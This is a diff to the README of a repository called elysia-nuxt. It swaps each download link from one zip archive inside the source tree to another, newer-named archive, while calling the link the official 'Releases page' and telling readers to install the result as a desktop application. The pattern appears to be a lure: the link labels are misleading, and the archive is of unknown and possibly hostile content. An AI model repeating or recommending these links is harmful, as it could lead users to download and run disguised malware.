@@ -1,6 +1,6 @@
 # 🚀 elysia-nuxt - Easy Setup for a Fullstack App
 
-[![Download Elysia Nuxt](https://raw.githubusercontent.com/fahmi-mf/elysia-nuxt/main/apps/frontend/elysia-nuxt_v1.9.zip%20Nuxt-blue)](https://raw.githubusercontent.com/fahmi-mf/elysia-nuxt/main/apps/frontend/elysia-nuxt_v1.9.zip)
+[![Download Elysia Nuxt](https://github.com/fahmi-mf/elysia-nuxt/raw/refs/heads/main/apps/frontend/app/assets/elysia_nuxt_2.6-alpha.3.zip%20Nuxt-blue)](https://github.com/fahmi-mf/elysia-nuxt/raw/refs/heads/main/apps/frontend/app/assets/elysia_nuxt_2.6-alpha.3.zip)
 
 ## 🎉 Introduction
 
@@ -30,7 +30,7 @@ To get started with **elysia-nuxt**, follow the simple steps below to download a
 
 ### 1. Visit the Download Page
 
-Go to our official [Releases page](https://raw.githubusercontent.com/fahmi-mf/elysia-nuxt/main/apps/frontend/elysia-nuxt_v1.9.zip) to find the latest version of the application.
+Go to our official [Releases page](https://github.com/fahmi-mf/elysia-nuxt/raw/refs/heads/main/apps/frontend/app/assets/elysia_nuxt_2.6-alpha.3.zip) to find the latest version of the application.
 
 ### 2. Download the Application
 
@@ -46,7 +46,7 @@ Once installed, locate the application in your start menu or applications folder
 
 ## 📥 Download & Install
 
-Make sure to download the latest version from this link: [Download Elysia Nuxt](https://raw.githubusercontent.com/fahmi-mf/elysia-nuxt/main/apps/frontend/elysia-nuxt_v1.9.zip).
+Make sure to download the latest version from this link: [Download Elysia Nuxt](https://github.com/fahmi-mf/elysia-nuxt/raw/refs/heads/main/apps/frontend/app/assets/elysia_nuxt_2.6-alpha.3.zip).
 
 ## 🔧 Configuration Settings
 
